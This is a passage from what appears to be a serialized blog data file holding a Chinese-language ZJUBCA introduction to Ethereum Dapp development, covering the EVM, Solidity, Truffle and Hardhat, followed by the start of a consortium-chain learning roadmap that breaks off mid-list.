href=\"https://github.com/ethereum/go-ethereum\">🔗</a>：Golang 实现，官方推荐，开发使用最多</li>\n<li>Parity<a href=\"https://github.com/ethcore/parity/releases\">🔗</a>：Rust 实现，最轻便客户端，在历次以太网攻击中表现卓越</li>\n</ul>\n<h3 id=\"二、开发框架\"><a href=\"#二、开发框架\" class=\"headerlink\" title=\"二、开发框架\"></a>二、开发框架</h3><p>上文讲到，开发者如果想要跟以太坊交互，需要借助客户端来搭建节点才行。理论上虽然如此，但不禁想一下，如果每次开发都要手动搭建节点，且面向不同以太坊网络时还应重新搭建，未免给我们的开发增添了太多不必要的负担，对开发者的技术要求也更加严格，这显然是不利于以太坊乃至区块链技术的普及。</p>\n<p>互联网软件开发的历史已有数十年之久。我们受益于半个世纪以来积累的最佳实践，设计模式和智慧。相反，智能合约开发才刚刚开始。2015 推出的以太坊和 Solidity 仅有几年的时间。在智能合约刚推出的前几年，没有确定的工具堆栈来帮助开发者部署智能合约以及构建去中心化应用。</p>\n<p>但随着区块链技术的蓬勃发展以及广大开发者极客们的集思广益，诸如 Truffle、Hardhat 的 Dapp 开发框架应用的出现，极大的方便了开发者与区块链的交互，丰富了整个以太坊生态系统。</p>\n<h4 id=\"Truffle\"><a href=\"#Truffle\" class=\"headerlink\" title=\"- Truffle\"></a>- Truffle</h4><p>Truffle 是第一套基于以太坊的 Solidity 语言的成熟的开发框架。本身是基于 JavaScript。它对客户端做了深度集成，使开发、测试、部署都只需要一个命令行，可以在控制台使用命令行直接调用输出结果，方便调试。<br>Truffle 是本地编译、部署智能合约的框架；而向前文中提到的 geth 客户端连接的才是真正的以太坊环境；testrpc 是 Truffle 本地使用内存模拟的以太坊环境，关闭终端后，部署到 testrpc 的智能合约不会保存下来，对于开发调试更加方便，合约可以在 testrpc 中通过测试后，再部署到 geth 上，从而减少不必要的损失。</p>\n<ul>\n<li>Truffle：<a href=\"https://learnblockchain.cn/docs/truffle/quickstart.html\">🔗</a></li>\n</ul>\n<h4 id=\"Hardhat\"><a href=\"#Hardhat\" class=\"headerlink\" title=\"- Hardhat\"></a>- Hardhat</h4><p>Hardhat 是一个编译、部署、测试和调试以太坊应用的开发环境。它可以帮助开发者管理和自动化构建智能合约和 dApps 过程中固有的重复性任务，并围绕这一工作流程轻松引入更多功能。<br>Hardhat 内置了 Hardhat 网络，这是一个专为开发设计的本地以太坊网络。主要功能有 Solidity 调试，跟踪调用堆栈、console.log()和交易失败时的明确错误信息提示等，其在智能合约的 Debug 调试过程的交互性要优于 Truffle。<br>除此之外，与 Truffle 不同的是，Hardhat 是一款基于插件的开发框架，其很多功能都来自于插件，开发者可以自由选择想使用的插件，甚至还可以将现有的 Truffle 项目迁移到 Hardhat 上。</p>\n<ul>\n<li>Hardhat：<a href=\"https://learnblockchain.cn/docs/hardhat/getting-started\">🔗</a></li>\n</ul>\n<h3 id=\"三、Dapp-开发\"><a href=\"#三、Dapp-开发\" class=\"headerlink\" title=\"三、Dapp 开发\"></a>三、Dapp 开发</h3><h4 id=\"什么是-Dapp\"><a href=\"#什么是-Dapp\" class=\"headerlink\" title=\"什么是 Dapp?\"></a>什么是 Dapp?</h4><p>App 我们都知道是客户端应用，是 application 的简称。DApp 就是 D+App，D 是英文单词 decentralization 的首字母，单词翻译中文是去中心化，即 DApp 为去中心化应用。</p>\n<p>看到这里，大家思维中第一反应可能是，为什么要有 DApp，现在的 App 不是挺好吗？其实，两者并不是取代关系，而是并存关系，或者说 DApp 是对 App 的丰富和完善。因为 DApp 是依托于区块链底层技术的上层建筑，它和交易数据、交易资产有关联，和不可篡改去中心化存储也有关联，所以随着区块链技术越来越成熟普及，DApp 也更受到人们的青睐与期望，并更多地出现在各个生活场景中，如生产链防伪，捐款资金流向等等。</p>\n<p><img src=\"/./pic/10.png\"></p>\n<p>那么作为一名开发者，是开发一款自己的 Dapp 需要做的具体步骤是什么？<br>Dapp 的一般开发流程：</p>\n<ol>\n<li>创建自己的 Web3.0 钱包</li>\n<li>使用 Solidity 编写智能合约代码</li>\n<li>通过 Dapp 开发框架如 Hardhat、Truffle，通过 node.js 测试合约并部署</li>\n<li>编写前端界面，并通过如 ether.js、web3.js 与智能合约进行交互</li>\n<li>项目发布与测试</li>\n</ol>\n<ul>\n<li>node.js 介绍文档：<a href=\"https://www.runoob.com/nodejs/nodejs-tutorial.html\">🔗</a></li>\n<li>ether.js 中文文档：<a href=\"https://learnblockchain.cn/docs/ethers.js\">🔗</a></li>\n<li>web3.js(1.0)中文文档：<a href=\"http://cw.hubwiz.com/card/c/web3.js-1.0/1/1/1/\">🔗</a></li>\n</ul>\n<h2 id=\"常用工具及网站\"><a href=\"#常用工具及网站\" class=\"headerlink\" title=\"常用工具及网站\"></a>常用工具及网站</h2><h3 id=\"一、数据查询\"><a href=\"#一、数据查询\" class=\"headerlink\" title=\"一、数据查询\"></a>一、数据查询</h3><ul>\n<li>Etherscan —以太坊区块链浏览器：<a href=\"https://etherscan.io/\">🔗</a></li>\n<li>Ethereum Signature Database —EVM 调用记录数据库：<a href=\"https://www.4byte.directory/\">🔗</a></li>\n<li>ENS —以太坊域名系统：<a href=\"https://app.ens.domains/\">🔗</a></li>\n</ul>\n<h3 id=\"二、合约开发\"><a href=\"#二、合约开发\" class=\"headerlink\" title=\"二、合约开发\"></a>二、合约开发</h3><ul>\n<li>ChainIDE —支持多链的在线合约开发工具：<a href=\"https://chainide.com/zh-CN\">🔗</a></li>\n<li>Chainlist —EVM 网络列表：<a href=\"https://chainlist.org/\">🔗</a></li>\n<li>The Graph —链上数据获取：<a href=\"https://thegraph.com/\">🔗</a></li>\n<li>Chainlink —第三方预言机：<a href=\"https://docs.chain.link/\">🔗</a></li>\n<li>Alchemy —第三方节点提供商：<a href=\"https://dashboard.alchemyapi.io/signup/chain\">🔗</a></li>\n</ul>\n<h3 id=\"三、社区交流\"><a href=\"#三、社区交流\" class=\"headerlink\" title=\"三、社区交流\"></a>三、社区交流</h3><ul>\n<li>登链社区 —区块链开发者论坛：<a href=\"https://learnblockchain.cn/\">🔗</a></li>\n<li>巴比特 —区块链资讯平台：<a href=\"https://www.8btc.com/\">🔗</a></li>\n<li>Ethereum —以太坊基金会官方开发网站：<a href=\"https://ethereum.org/en/developers\">🔗</a></li>\n<li>Stack Overflow —程序开发交流社区：<a href=\"https://stackoverflow.com/\">🔗</a></li>\n</ul>\n","excerpt":"","more":"<h1 id=\"初探以太坊-Dapp-开发\"><a href=\"#初探以太坊-Dapp-开发\" class=\"headerlink\" title=\"初探以太坊 Dapp 开发\"></a>初探以太坊 Dapp 开发</h1><p>BY ZJUBCA</p>\n<p>本文假设读者已经对区块链有了基本的概念，如果你对诸如区块链、智能合约与 Dapp 这类词语完全陌生，那么我们建议读者先阅读协会的：<a href=\"../index.md\">🔗ZJUBCA-Roadmap</a></p>\n<h2 id=\"以太坊技术原理\"><a href=\"#以太坊技术原理\" class=\"headerlink\" title=\"以太坊技术原理\"></a>以太坊技术原理</h2><h3 id=\"一、什么是以太坊（Ethereum）\"><a href=\"#一、什么是以太坊（Ethereum）\" class=\"headerlink\" title=\"一、什么是以太坊（Ethereum）\"></a>一、什么是以太坊（Ethereum）</h3><p>对以太坊的定义往往仁者见仁，但如果集大成来解释，以太坊是基于状态转换的「世界计算机」（所有人都可以访问并使用的计算机，不受空间限制）</p>\n<p>从计算机科学的角度来看，以太坊是一种确定但无界的由交易驱动的「状态机」（改变程序或系统保存的信息并保持共识的机体），它由全局可访问的离散单个状态和将变化应用于这种状态的虚拟机组成；从更实际的角度来看，以太坊是一种开源、在全球范围内呈去中心化并且能够执行「智能合约」（下文会详述，可简单理解为代码）的基础设施。</p>\n<p>在以太坊平台上，开发人员能够构建具有内置经济功能的强大的去中心化应用程序。它使用区块链来同步和存储系统的状态变化，并使用一种被称为「以太币」（Ether）的加密货币来计量和限制执行资源成本，提供了高可用性，可审计性，透明性和中立性。</p>\n<p><a href=\"https://kauri.io/#collections/A%20Hackathon%20Survival%20Guide/ethereum-101-part-1-what-is-ethereum/\">🔗 以太坊白皮书</a></p>\n<h3 id=\"二、深入理解以太坊技术原理\"><a href=\"#二、深入理解以太坊技术原理\" class=\"headerlink\" title=\"二、深入理解以太坊技术原理\"></a>二、深入理解以太坊技术原理</h3><p>可能大家对上一节中提到的「状态机」的概念还有点模糊不清，为了让大家更清晰的深入到以太坊的技术原理中去，本节会以传统互联网为起点，循序渐进至以太坊的底层技术原理。</p>\n<p>用计算机技术来说，以太坊就是一个保存了数字交易永久记录的「公共数据库」。重要的是，这个数据库不需要任何中间方来维护双方的权益。相反，它可以作为一种「无需信任」的交易系统来运作，也就是你可以在不需要第三方的情况下进行点对点（P2P）交易。<br><img src=\"/./pic/1.png\"></p>\n<p>以太坊区块链本质上是一个为交易服务的状态机。在计算机科学中，一个状态机指的是这样一种东西，它可以读取一系列的输入，并基于这些输入产生一个新的状态。</p>\n<p><img src=\"/./pic/2.png\"></p>\n<p>以太坊状态机的运行从一个「元状态」开始，这类似于在网络上没有发生任何交易之前的一个空白匣子。当交易执行时，这个元状态就转变为一些最终状态。在任何时候，这个最终状态都代表着以太坊区块链的现状。</p>\n<p><img src=\"/./pic/3.png\"></p>\n<p>以太坊系统中运行着数百万笔交易，这些交易被分组归类为「区块」。每个区块由「区块头」（Header）和一系列「交易信息」(Transactions）组成。在这里，你可以简单地将区块头理解为一个包含决定区块链共识状态关键信息的 “数据集合”， 每个块只有通过对区块头的验证，才能与其前面的区块通过区块头串联在一起形成有向无环的链式结构。</p>\n<p><img src=\"/./pic/4.png\"></p>\n<p>前文中提到，以太坊是由交易驱动的状态机。那么要想以太坊正确的从一个状态转到另一个状态，必须证明交易是有效且真实的，否则以太坊便失去了其不需要第三方维护这一核心价值。要想证明一个交易是有效的，就必须通过一个验证过程，这一过程称为「挖矿」。</p>\n<p>挖矿是指一组节点（即物理意义上的计算机）消耗它们的计算资源来创建一个有效交易的区块（这里仅以 Pow 为例）。网络中参与挖矿的节点被称为「矿工」。任何声明自己是「矿工」的节点都可以尝试创建和验证区块，全世界有许多矿工试图同时创建和验证区块。每个矿工在向区块链提交一个区块时同时，都要提供一个数学的证明，且把这个证明作为一个保证：如果这个数学证明存在，则该区块必然是有效的。</p>\n<p>一个矿工如果想要在主区块链上添加一个合法区块，就必须比其他矿工更快地对其证明。那么，通过让矿工提供数学证明来验证每个区块的过程被称为「工作量证明」。</p>\n<p>那么矿工为什么要消耗自己的计算机资源来验证并添加区块呢？答案是价值回报。任何完成这个验证工作的矿工都可以得到一定数额的价值回报。以太坊正是采用其链上数字货币「以太币」作为奖励。 每当一个矿工证明了一个区块，就会生成并得到一定数量的以太币。</p>\n<p>正如我们在上文给区块链的定义，区块链是一个具有共享状态的交易状态机。这个定义决定了，区块链的当前状态是一个单一的全局状态，每个人都必须接受。如果拥有多个链（状态）会破坏整个系统，因为人们不可能就哪个状态是正确的状态达成一致意见。如果这些链是分开的，就会出现一个人在一条链上有 10 个以太币，在另一条链上有 20 个的情况。在这种情况下，我们没有办法确定哪一个链最「有效」，无法确定一个人有多少有效的以太币。</p>\n<p>这一产生多条链的过程，被称为「分叉」（Fork）。因为分叉会破坏系统，因此我们通常会避免分叉，要求或者说迫使人们选择他们「相信」唯一有效的一条链。</p>\n<p><img src=\"/./pic/5.png\"></p>\n<p>为了确定哪个路径是最有效的，并防止分叉的发生，以太坊使用了一种叫做「GHOST 协议」的机制。简单地说，GHOST 协议让我们必须选择在链上做「最多计算」的路径。确定该路径的一种方法是通过计算每条链所使用最新区块的数量，来表示当前每条链上的区块总数（不包括创世区块）。块数越多，路径越长，则说明挖矿的难度越大，因此该链就为最多计算链。因此这个方法也可以被简称为「最长链原则」。通过这个方式，最终使每一个节点对当前区块链的状态（链）的唯一性达成共识。</p>\n<p><img src=\"/./pic/6.png\"></p>\n<p>到这里，我们就对以太坊区块链就有了一个宏观的认识。在这个链式架构的基础上，以太坊系统由如下所述的各主要组成部分支撑，如果你想更深入的了解这些，我们推荐你阅读以太坊黄皮书，不过请注意，他并没有那么易懂~</p>\n<p><a href=\"https://gitcode.net/mirrors/wanshan1024/ethereum_yellowpaper\">🔗 以太坊黄皮书</a></p>\n<ul>\n<li>帐户；</li>\n<li>状态；</li>\n<li>Gas 与费用；</li>\n<li>交易；</li>\n<li>区块；</li>\n<li>交易执行；</li>\n<li>挖矿；</li>\n<li>工作量证明。</li>\n</ul>\n<h2 id=\"Solidity-及-EVM\"><a href=\"#Solidity-及-EVM\" class=\"headerlink\" title=\"Solidity 及 EVM\"></a>Solidity 及 EVM</h2><h3 id=\"一、Solidity——面向合约对象的编程语言\"><a href=\"#一、Solidity——面向合约对象的编程语言\" class=\"headerlink\" title=\"一、Solidity——面向合约对象的编程语言\"></a>一、Solidity——面向合约对象的编程语言</h3><p>Solidity 是由以太坊创始人之一的 Gavin Wood 所编写，是一门面向合约的、为实现智能合约而创建的高级编程语言。这门语言受到了 C++，Javascript 等语言的影响，属于静态类型语言，支持继承、库和复杂的用户定义类型等特性。其设计目的是为了能在以太坊虚拟机（EVM）上运行。</p>\n<p>众所周知，以太坊之所以被称为区块链 2.0 的开山鼻祖，其中重要的一点就是实现了「图灵完备」。所谓图灵完备，就是一切可计算的问题都能计算，这样的虚拟机或者编程语言就叫图灵完备的，图灵完备通常指具有无限存储能力的通用物理机器或编程语言。那么与图灵完备相反的是图灵不完备，比如比特币的脚本系统，就是图灵不完备的。要想充分发挥以太坊图灵完备的优势，就要通过编写运行在 EVM 上（也可以理解为链上）的「智能合约」。那么 Solidity，就是编写智能合约的编程语言。</p>\n<p>当然，除了 Solidity 以外，还有例如与 Python 接近的、文件名以.se 结尾 Serpent 编程语言也曾经流行过一段时间，除此之外也有开发者更喜欢使用 Vyper。但随着时间的推移和开发者们不断地学习和迭代，现在最成熟且应用最多的当数是 Solidity 了，因此这也是我们鼓励大家学习它的原因。</p>\n<p>以下是通过 Solidity 编写的“Hello Wordl!”代码，其中，^0.8.0 是编译器的版本号，HelloWorld 是合约名，greet 是状态变量。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs solidity\">// SPDX-Lisence-Identifier: MIT<br>// compiler version must be greater than or equal to 0.8.10 and less than 0.9.0<br>pragma solidity ^0.8.10;<br><br>contract HelloWorld &#123;<br>  string public greet = &quot;Hello World!&quot;;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>如果你已经迫不及待的想要成为一名智能合约开发者，那么以下列出的学习工具一定有助于你：</p>\n<ul>\n<li>Remix —智能合约在线开发工具：<a href=\"https://remix.ethereum.org/\">🔗</a></li>\n<li>Solidity 最新(0.8.0)中文文档：<a href=\"https://learnblockchain.cn/docs/solidity\">🔗</a></li>\n<li>Cryptozombies —玩游戏的方式学习 Solidity：<a href=\"https://cryptozombies.io/\">🔗</a></li>\n<li>Solidity by Example —以太坊官方教程：<a href=\"https://solidity-by-example.org/\">🔗</a></li>\n</ul>\n<h3 id=\"二、EVM——基于堆栈的以太坊虚拟机\"><a href=\"#二、EVM——基于堆栈的以太坊虚拟机\" class=\"headerlink\" title=\"二、EVM——基于堆栈的以太坊虚拟机\"></a>二、EVM——基于堆栈的以太坊虚拟机</h3><p>在了解 EVM 之前，首先清楚什么是虚拟机？传统的虚拟机指的是，通过软件模拟的，具备完整硬件系统功能，并运行在隔离环境下的完整计算机系统，比如 VMware、Java 虚拟机等。<br>那么什么是以太坊虚拟机呢？</p>\n<p>以太坊虚拟机的英文全称为“Ethereum Virtual Machine”，简称为 EVM，这个 EVM 就是建立在以太坊区块链上的代码运行环境，是一个完全独立的沙盒，合约代码可对外完全隔离并在 EVM 内部运行，其主要作用是处理以太坊系统内的智能合约。上文提到的 Solidity 代码在部署到以太坊网络之前需要被编译成字节码。这个字节码所对应的底层机制，实际上就是 EVM 所解析的一系列操作码指令，然后由 EVM 根据此操作码，真正的完成代码的执行。</p>\n<p>从传统互联网的角度来说，程序员在为一个软件编写程序时，会使用到编程语言，例如 C++。但 C++ 是计算机的 CPU 无法理解的高级语言。程序员通过 C++ 编写好的程序需要通过编译器翻译成 CPU 可以理解的语言，即字节代码（机器语言），从而对 CPU 发号施令让软件可以在计算机上顺利运行。</p>\n<p>如果听到这里你觉得有些困惑，不必担心，坚持看完下面的例子，一定能“柳暗花明又一村”。</p>\n<p>假设一名 ZJUBCAer 小蓝是一个英语盲，但作为一名区块链爱好者，它需要经常查看一些英语文章来及时掌握行业信息。为了解决语言障碍，它会把文章通过翻译软件转译成中文再阅读。</p>\n<p><img src=\"/./pic/8.png\"></p>\n<p>一篇用英语写成的文章被翻译为中文，变成了小蓝能看懂的语言，从而帮助小蓝能够轻松掌握区块链的行业信息。同理，一个用 C++ 编成的程序被编译为字节代码，变成 CPU 能看懂的语言，CPU 可以运行软件程序。<br>可这跟以太坊的 EVM 有什么关系？答案是，EVM 之于以太坊，就像 CPU 之于计算机。</p>\n<p><img src=\"/./pic/9.png\"></p>\n<p>以太坊是一台世界级计算机，但它毕竟不是实体电脑，也没有 CPU，那么智能合约要如何在以太坊上运行呢？EVM 就是以太坊的 CPU，以太坊开发者们通过编程语言 Solidity 写好的程序，被编译为 EVM 可以理解的 EVM 字节代码，EVM 就可以运行智能合约的程序。</p>\n<p>到这里，相信你一定对 EVM 有了初步的认识，如果你想更进一步，那么我们建议你通过 EVM 练兵场，通过学以致用的方式，更好的掌握 EVM 的底层逻辑。</p>\n<p>EVM 练兵场：<a href=\"https://www.evm.codes/\">🔗</a></p>\n<h2 id=\"智能合约开发\"><a href=\"#智能合约开发\" class=\"headerlink\" title=\"智能合约开发\"></a>智能合约开发</h2><p>什么是智能合约？其实通过上文的阅读，相信读者已经大概做到了心中有数，以太坊网络上运行程序就称之为智能合约，它和其他的程序一样，也是代码和数据(状态)的集合。</p>\n<p>智能合约（Smart Contract）和人工智能（Artificial Intelligence ）的智能没有关系，智能合约最早由尼克萨博在 95 年提出，它的概念很简单，就是将法律条文写成可执行代码。让法律条文的执行中立化，这个理念和区块链上的程序可以不被篡改、不被干预（只有有人触发交易，它将自动执行）的执行不谋而合，因此区块链引入了这个概念。以太坊网络上运行程序就称之为智能合约。</p>\n<h3 id=\"一、以太坊客户端\"><a href=\"#一、以太坊客户端\" class=\"headerlink\" title=\"一、以太坊客户端\"></a>一、以太坊客户端</h3><p>大家都知道，如果想跟一个独立系统交互，仅仅编写了可以被该系统编译识别的代码还不够，还需要与该系统建立稳定的连接才能将数据传输过去。前文提到，以太坊虚拟机 EVM 是一个封闭的沙盒系统，其内部代码的运行是不受到外部世界的干扰的。那么，开发者如果想访问到以太坊并且期望与之交互应该怎么做呢？答案是通过以太坊客户端。</p>\n<p>「以太坊客户端」是一个软件应用程序，它实现以太坊规范并通过 P2P 网络与其他以太坊客户端（节点）进行通信。如果不同的以太坊客户端符合参考规范和标准化通信协议，则可以进行相互操作。</p>\n<p>以太坊是一个开源项目，由“黄皮书”正式规范定义。除了各种以太坊改进提案之外，此正式规范还定义了以太坊客户端的标准行为。因为以太坊有明确的正式规范，所以，任何一个独立开发的软件，只要实现了该范式，那他就可以作为一个以太坊节点，与以太坊或其它以太坊客户端交互。<br>目前以太坊客户端支持 8 种语言的客户端，这里推荐其中两款：</p>\n<ul>\n<li>go-ethereum（geth）<a href=\"https://github.com/ethereum/go-ethereum\">🔗</a>：Golang 实现，官方推荐，开发使用最多</li>\n<li>Parity<a href=\"https://github.com/ethcore/parity/releases\">🔗</a>：Rust 实现，最轻便客户端，在历次以太网攻击中表现卓越</li>\n</ul>\n<h3 id=\"二、开发框架\"><a href=\"#二、开发框架\" class=\"headerlink\" title=\"二、开发框架\"></a>二、开发框架</h3><p>上文讲到，开发者如果想要跟以太坊交互，需要借助客户端来搭建节点才行。理论上虽然如此，但不禁想一下，如果每次开发都要手动搭建节点，且面向不同以太坊网络时还应重新搭建，未免给我们的开发增添了太多不必要的负担，对开发者的技术要求也更加严格，这显然是不利于以太坊乃至区块链技术的普及。</p>\n<p>互联网软件开发的历史已有数十年之久。我们受益于半个世纪以来积累的最佳实践，设计模式和智慧。相反，智能合约开发才刚刚开始。2015 推出的以太坊和 Solidity 仅有几年的时间。在智能合约刚推出的前几年，没有确定的工具堆栈来帮助开发者部署智能合约以及构建去中心化应用。</p>\n<p>但随着区块链技术的蓬勃发展以及广大开发者极客们的集思广益，诸如 Truffle、Hardhat 的 Dapp 开发框架应用的出现，极大的方便了开发者与区块链的交互，丰富了整个以太坊生态系统。</p>\n<h4 id=\"Truffle\"><a href=\"#Truffle\" class=\"headerlink\" title=\"- Truffle\"></a>- Truffle</h4><p>Truffle 是第一套基于以太坊的 Solidity 语言的成熟的开发框架。本身是基于 JavaScript。它对客户端做了深度集成，使开发、测试、部署都只需要一个命令行，可以在控制台使用命令行直接调用输出结果，方便调试。<br>Truffle 是本地编译、部署智能合约的框架；而向前文中提到的 geth 客户端连接的才是真正的以太坊环境；testrpc 是 Truffle 本地使用内存模拟的以太坊环境，关闭终端后，部署到 testrpc 的智能合约不会保存下来，对于开发调试更加方便，合约可以在 testrpc 中通过测试后，再部署到 geth 上，从而减少不必要的损失。</p>\n<ul>\n<li>Truffle：<a href=\"https://learnblockchain.cn/docs/truffle/quickstart.html\">🔗</a></li>\n</ul>\n<h4 id=\"Hardhat\"><a href=\"#Hardhat\" class=\"headerlink\" title=\"- Hardhat\"></a>- Hardhat</h4><p>Hardhat 是一个编译、部署、测试和调试以太坊应用的开发环境。它可以帮助开发者管理和自动化构建智能合约和 dApps 过程中固有的重复性任务，并围绕这一工作流程轻松引入更多功能。<br>Hardhat 内置了 Hardhat 网络，这是一个专为开发设计的本地以太坊网络。主要功能有 Solidity 调试，跟踪调用堆栈、console.log()和交易失败时的明确错误信息提示等，其在智能合约的 Debug 调试过程的交互性要优于 Truffle。<br>除此之外，与 Truffle 不同的是，Hardhat 是一款基于插件的开发框架，其很多功能都来自于插件，开发者可以自由选择想使用的插件，甚至还可以将现有的 Truffle 项目迁移到 Hardhat 上。</p>\n<ul>\n<li>Hardhat：<a href=\"https://learnblockchain.cn/docs/hardhat/getting-started\">🔗</a></li>\n</ul>\n<h3 id=\"三、Dapp-开发\"><a href=\"#三、Dapp-开发\" class=\"headerlink\" title=\"三、Dapp 开发\"></a>三、Dapp 开发</h3><h4 id=\"什么是-Dapp\"><a href=\"#什么是-Dapp\" class=\"headerlink\" title=\"什么是 Dapp?\"></a>什么是 Dapp?</h4><p>App 我们都知道是客户端应用，是 application 的简称。DApp 就是 D+App，D 是英文单词 decentralization 的首字母，单词翻译中文是去中心化，即 DApp 为去中心化应用。</p>\n<p>看到这里，大家思维中第一反应可能是，为什么要有 DApp，现在的 App 不是挺好吗？其实，两者并不是取代关系，而是并存关系，或者说 DApp 是对 App 的丰富和完善。因为 DApp 是依托于区块链底层技术的上层建筑，它和交易数据、交易资产有关联，和不可篡改去中心化存储也有关联，所以随着区块链技术越来越成熟普及，DApp 也更受到人们的青睐与期望，并更多地出现在各个生活场景中，如生产链防伪，捐款资金流向等等。</p>\n<p><img src=\"/./pic/10.png\"></p>\n<p>那么作为一名开发者，是开发一款自己的 Dapp 需要做的具体步骤是什么？<br>Dapp 的一般开发流程：</p>\n<ol>\n<li>创建自己的 Web3.0 钱包</li>\n<li>使用 Solidity 编写智能合约代码</li>\n<li>通过 Dapp 开发框架如 Hardhat、Truffle，通过 node.js 测试合约并部署</li>\n<li>编写前端界面，并通过如 ether.js、web3.js 与智能合约进行交互</li>\n<li>项目发布与测试</li>\n</ol>\n<ul>\n<li>node.js 介绍文档：<a href=\"https://www.runoob.com/nodejs/nodejs-tutorial.html\">🔗</a></li>\n<li>ether.js 中文文档：<a href=\"https://learnblockchain.cn/docs/ethers.js\">🔗</a></li>\n<li>web3.js(1.0)中文文档：<a href=\"http://cw.hubwiz.com/card/c/web3.js-1.0/1/1/1/\">🔗</a></li>\n</ul>\n<h2 id=\"常用工具及网站\"><a href=\"#常用工具及网站\" class=\"headerlink\" title=\"常用工具及网站\"></a>常用工具及网站</h2><h3 id=\"一、数据查询\"><a href=\"#一、数据查询\" class=\"headerlink\" title=\"一、数据查询\"></a>一、数据查询</h3><ul>\n<li>Etherscan —以太坊区块链浏览器：<a href=\"https://etherscan.io/\">🔗</a></li>\n<li>Ethereum Signature Database —EVM 调用记录数据库：<a href=\"https://www.4byte.directory/\">🔗</a></li>\n<li>ENS —以太坊域名系统：<a href=\"https://app.ens.domains/\">🔗</a></li>\n</ul>\n<h3 id=\"二、合约开发\"><a href=\"#二、合约开发\" class=\"headerlink\" title=\"二、合约开发\"></a>二、合约开发</h3><ul>\n<li>ChainIDE —支持多链的在线合约开发工具：<a href=\"https://chainide.com/zh-CN\">🔗</a></li>\n<li>Chainlist —EVM 网络列表：<a href=\"https://chainlist.org/\">🔗</a></li>\n<li>The Graph —链上数据获取：<a href=\"https://thegraph.com/\">🔗</a></li>\n<li>Chainlink —第三方预言机：<a href=\"https://docs.chain.link/\">🔗</a></li>\n<li>Alchemy —第三方节点提供商：<a href=\"https://dashboard.alchemyapi.io/signup/chain\">🔗</a></li>\n</ul>\n<h3 id=\"三、社区交流\"><a href=\"#三、社区交流\" class=\"headerlink\" title=\"三、社区交流\"></a>三、社区交流</h3><ul>\n<li>登链社区 —区块链开发者论坛：<a href=\"https://learnblockchain.cn/\">🔗</a></li>\n<li>巴比特 —区块链资讯平台：<a href=\"https://www.8btc.com/\">🔗</a></li>\n<li>Ethereum —以太坊基金会官方开发网站：<a href=\"https://ethereum.org/en/developers\">🔗</a></li>\n<li>Stack Overflow —程序开发交流社区：<a href=\"https://stackoverflow.com/\">🔗</a></li>\n</ul>\n"},{"title":"04-联盟链","date":"2024-08-01T16:03:18.000Z","_content":"# Consortium Blockchain-roadmap 2024\n\n联盟链学习路线总结，不断更新。\n\n—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）\n\n## 第一层\n\n-   **基本概念**：\n    -   什么是公有链、联盟链和私有链？(万向区块链实验室动画教程) [🔗](https://v.qq.com/x/page/a0328vol40v.html)\n    -   Blockchain Consortium: Advantages And Disadvantages[🔗](https://dataconomy.com/2023/01/blockchain-consortium-advantages/)\n    -   A Complete Guide to Consortium Blockchain And Its Features[🔗](https://www.analyticsvidhya.com/blog/2023/01/a-complete-guide-to-consortium-blockchain-and-its-features/)\n    -   Everything You Need To Know About Consortium Blockchain[🔗](https://www.blockchain-council.org/blockchain/everything-you-need-to-know-about-consortium-blockchain/)\n-   **解读与讨论**：\n    -   联盟链战国：五大巨头横向对比 [🔗](https://www.infoq.cn/article/5-consortium-blockchain-comparison/)\n    -   基于联盟链技术的隐私保护金融应用研究报告 [🔗](https://www.bfia.org.cn/upload/file/20221201/1669860599908060153.pdf)\n    -   研报：连通公链和联盟链的研究 [🔗](https://www.8btc.com/article/6582723)\n    -   安全问题成短板，联盟链发展背后的安全如何保障？[🔗](https://www.chainnews.com/articles/576303926328.htm)\n    -   联盟链智能合约安全浅析 [🔗](https://paper.seebug.org/1317/)\n    -   怎样让你的区块链更加安全可控[🔗](https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/1_conception/safe_and_controllable.html)\n    -   盘点国内联盟链及现状 [🔗](https://zhuanlan.zhihu.com/p/519283107)\n\n## 第二层\n\n-   **技术原理**\n    -   共识机制\n        -   区块链共识机制浅谈：[🔗](https://blog.csdn.net/jeffrey__zhou/article/details/56672948)\n        -   [区块链] 共识算法之争（PBFT，Raft，PoW，PoS，DPoS，Ripple）:[🔗](https://www.cnblogs.com/X-knight/p/9157814.html)\n        -   深度分析 Raft 的主要特点：[🔗](https://mp.weixin.qq.com/s/yxJNsFzhpShzRvU9djhTjQ)\n        -   Paxos，Raft，Zab 一致性协议-Raft 篇：[🔗](https://mp.weixin.qq.com/s/5EZ2_vIzHEymJPxeSZtlmg)\n        -   深入剖析区块链的共识算法 Raft & PBFT：[🔗](https://mp.weixin.qq.com/s/ITCaMKdYrdlvQ0IGW3qpKg)\n    -   密码学相关\n        -   RSA、ECC、国密等加密算法\n        -   数字签名\n        -   零知识证明\n        -   多方安全计算\n    -   网络通信\n        -   联盟链网络专栏(Hyperledger Fabric)：[🔗](https://hyperledger-fabric.readthedocs.io/zh_CN/latest/network/network.html)\n        -   【网络专栏】联盟链的通信安全如何保障？：[🔗](https://tech.hyperchain.cn/wang-luo-zhuan-lan-lian-meng-lian-de-tong-xin-an-quan-ru-he-bao-zhang/)\n    -   存储相关\n        -   IPFS：[🔗](https://docs.ipfs.tech/)\n        -   传统数据库如 mysql、CouchDB、MongoDB 等\n    -   智能合约\n        -   智能合约初探：概念与演变：[🔗](https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/3_features/35_contract/smart_contract_concept_and_evolution.html)\n        -   联盟链的智能合约多采用 go、java 等语言编写，不同联盟链框架对合约语言的支持不同，可根据需要进一步学习\n-   **源码分析**\n    -   《Hyperledger Fabric 源代码分析与深入解读》\n    -   Hyperledger Fabric v2.x 最新资料汇总[🔗](https://hello2mao.github.io/2020/04/22/hyperledger-fabric-v2.x-info/)\n    -   Fabric2.2 中的 Raft 共识模块源码分析[🔗](https://www.cnblogs.com/GarrettWale/p/16131853.html)\n    -   深入浅出 FISCO BCOS[🔗](https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/index.html)\n    -   FISCO BCOS 核心模块设计解析[🔗](https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/design/index.html)\n\n## 第三层\n\n-   